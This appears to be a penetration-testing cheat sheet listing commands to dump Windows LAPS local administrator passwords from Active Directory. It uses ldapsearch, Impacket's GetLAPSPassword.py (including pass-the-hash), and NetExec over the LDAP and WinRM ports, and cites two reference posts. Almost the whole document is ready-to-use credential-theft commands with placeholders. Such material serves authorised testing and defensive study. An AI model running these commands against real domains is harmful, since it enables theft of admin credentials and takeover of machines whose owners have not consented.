# Unix Shell

## 01 - LDAP Port

### 1.1 - `ldapsearch`

```
$ ldapsearch -x -h <domain_controller_IP> -D "<username>" -w "<password>" -b "dc=<domain>,dc=<tld>" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd
```

### 1.2 - Impacket

```
$ GetLAPSPassword.py [<domain>/]"<username>":"<password>"@<IP>
```

Pass the Hash

```
$ GetLAPSPassword.py [<domain>/]"<username>"@<IP> -hashes :<nt_hash>
```

### 1.3 - NetExec

```
$ netexec ldap <IP> -u "<username>" -p "<password>" [-d <domain>] -kdcHost <domain_controller_IP> -M laps
```

## 02 - WinRM Port

```
$ netexec winrm <IP> -u "<username>" -p "<password>" [-d <domain>] -kdcHost <domain_controller_IP> -M laps
```

---
## References

### Mubix

- [Malicious.link: Dump LAPS passwords with ldapsearch](https://room362.com/posts/2017/dump-laps-passwords-with-ldapsearch/)

### NetExec

- [NetExec Wiki: Defeating LAPS](https://www.netexec.wiki/winrm-protocol/defeating-laps)